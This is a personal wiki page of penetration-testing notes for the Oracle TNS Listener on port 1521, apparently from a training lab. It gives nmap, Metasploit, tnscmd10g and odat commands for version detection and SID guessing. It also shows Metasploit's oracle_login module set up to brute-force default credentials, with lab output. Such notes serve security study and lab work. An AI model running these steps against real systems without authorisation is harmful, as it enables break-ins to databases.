Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-11-26T13:11:25-05:00

====== 1521 Oracle TNS Listener ======
Created Friday 26 November 2021

===== Version =====
{{{code: lang="texinfo" linenumbers="False"
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>			# NMAP
msf> use auxiliary/scanner/oracle/tnslsnr_version				# Metsploit
tnscmd10g version -p 1521 -h <IP>								# Tn
}}}


If you receive an error, could be because TNS versions are incompatible (Use the --10G parameter with tnscmd10) and if the error persist, the listener may be password protected.


===== Valid SID's =====
{{{code: lang="texinfo" linenumbers="False"
┌──(kali㉿PWK)-[~/pubserv/10.11.1.222/scans]
└─$ odat sidguesser -s 10.11.1.222

[1] (10.11.1.222:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.11.1.222:1521 server
[+] 'XE' is a valid SID. Continue...                            
[+] 'XEXDB' is a valid SID. Continue...                         
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.11.1.222:1521)
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.11.1.222:1521)
[+] 'XE' is a valid SID. Continue...    
[+] SIDs found on the 10.11.1.222:1521 server: XE,XEXDB
}}}



===== Brute forcing credentials =====
{{{code: lang="texinfo" linenumbers="False"
┌──(kali㉿PWK)-[~/pubserv/10.11.1.222/scans]
└─$ msfconsole -q                                                                                                                                      1 ⨯
msf6 > use admin/oracle/oracle_login
msf6 auxiliary(admin/oracle/oracle_login) > options

Module options (auxiliary/admin/oracle/oracle_login):

   Name     Current Setting                                                              Required  Description
   ----     ---------------                                                              --------  -----------
   CSVFILE  /usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv  no        The file that contains a list of default accounts.
   RHOST                                                                                 yes       The Oracle host.
   RPORT    1521                                                                         yes       The TNS port.
   SID      ORCL                                                                         yes       The sid to authenticate with.

msf6 auxiliary(admin/oracle/oracle_login) > set RHOST 10.11.1.222
RHOST => 10.11.1.222
msf6 auxiliary(admin/oracle/oracle_login) > set SID XE
SID => XE
msf6 auxiliary(admin/oracle/oracle_login) > run

[*] Starting brute force on 10.11.1.222:1521...

}}}


===== SEE =====
[[Tools:Linux:tnscmd10g]]
[[Tools:Linux:nmap]]
[[Tools:Linux:odat]]
[[Technologies:Oracle:TNS]]
